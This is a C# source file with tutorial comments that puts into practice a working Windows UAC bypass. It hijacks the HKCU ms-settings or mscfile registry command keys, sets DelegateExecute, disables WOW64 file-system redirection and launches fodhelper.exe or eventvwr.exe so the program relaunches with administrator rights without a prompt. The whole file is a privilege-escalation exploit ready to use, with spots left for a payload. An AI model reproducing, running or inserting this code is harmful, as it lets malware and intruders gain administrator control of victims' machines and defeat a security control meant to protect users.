using System;	
using System.Runtime.InteropServices;	// to import the libraries
using Microsoft.Win32;					// for Registry editing
using System.Diagnostics;
using System.IO; 						// to check if fodhelper exists in System32
using System.Security.Principal;		// to check if your application is elevated.
using System.Collections.Generic;
using System.Windows.Forms;				// where the Application class is located, which can be useful for returning the current path of your own application (Application.ExecutablePath).

namespace UACBypassExample
{
     internal class Imports
     {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Wow64DisableWow64FsRedirection(out IntPtr oldValue);  
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Wow64RevertWow64FsRedirection(IntPtr oldValue);
     }
      
     internal class UAC
     {
        struct UACPath
        {
            public string RegPath;
            public string FilePath;

			// initialize 
            public UACPath(string RegPath, string FilePath)
            {
                 this.RegPath = RegPath;
                 this.FilePath = FilePath;
            }
        }

        public static void Bypass()
        {
             List<UACPath> upath = new List<UACPath>
             {
		          // FODHELPER METHOD: Windows 10 2016 and up.
                  new UACPath( "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command", "C:\\Windows\\System32\\fodhelper.exe" ), // 0
                  // EVENTVWR METHOD: Windows versions less than Windows 10
		          new UACPath( "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command",     "C:\\Windows\\System32\\eventvwr.exe"  )  // 1
             };

             IntPtr ov = IntPtr.Zero;

             try
             {
		          // to get the actual version, you need to embed the manifest with a <supportedOS>
                  // entry. Otherwise Environment.OSVersion might return Windows 8 instead of 10 in newer
                  // Windows versions. That entry is created along with the manifest, you just need to
                  // remove the comment tag or <!-- .. --> within the supportedOS entry.
                  bool isWin10up = (Environment.OSVersion.Version.Major >= 10 && Environment.OSVersion.Version.Build >= 14393) || File.Exists(upath[0].FilePath);
                  Registry.SetValue(upath[isWin10up ? 0 : 1].RegPath, "", $"{Application.ExecutablePath}" /* put any arguments here if you want. */);

                  if (isWin10up)
                        Registry.SetValue(upath[0].RegPath, "DelegateExecute", ""); // to disable UAC prompt in executing fodhelper.
                  
		          // use this if your program is running on 32 bit accessing 64 bit system files.
		          // it is used to prevent redirection to SysWOW64 when trying to access something
                  // on System32 especially if your OS is 64 bit, since both fodhelper and eventvwr
				  // doesn't even exists there (SysWOW64) somehow.
                  if (Imports.Wow64DisableWow64FsRedirection(out ov))
                  {
					    // Open the process to start your program in higher privileges 
					    // since both fodhelper and eventwvr will open your executable 
					    // that is located in the registry upon execution. 
					    
					    // In older Windows versions (< Windows 10). executing eventvwr will look
					    // for the registry where the MMC executable path is located, once found
					    // it will open MMC with eventvwr.msc to start the UI (with elevation ofc). 
					    // In this case, you can hijack the registry to start your program in higher privileges.
					  
					    // But in newer versions of Windows, MMC path is now hardcoded to eventvwr itself,
					    // so hijacking the registry and starting the program is useless. So that's why fodhelper
					    // method is used as an alternative for newer windows versions.

					    // Also as I said earlier, both eventvwr and fodhelper are trusted binaries in Windows
					    // so they can be executed with elevation without UAC prompt. But well the registry 
					    // "DelegateExecute" in fodhelper method is needed, otherwise it will ask the UAC prompt
					    // for elevation.
					  
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = upath[isWin10up ? 0 : 1].FilePath,
                            CreateNoWindow = true, // optional. 
                        }

                        ).WaitForExit();
                    }
                    else Console.WriteLine("Failed to disable WoW64FsRedirection");
              }
              catch (Exception ex)
              {
                  Console.WriteLine(ex.Message);
              }
              finally
              {
		            // Reverting is somewhat important.
                    if (!Imports.Wow64RevertWow64FsRedirection(ov))
                        Console.WriteLine("Failed to revert WoW64FsRedirection.");
              }
         }
     }

     public static class Program
     {
         static void Main(string[] args)
         {
             if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
             {
                 // do something, since your process is already elevated.
				 //    start.whatever("blah blah blah");
             }
             else
             {
                 // if not, perform a UAC bypass
                 UAC.Bypass();
             }
         }
     }
}
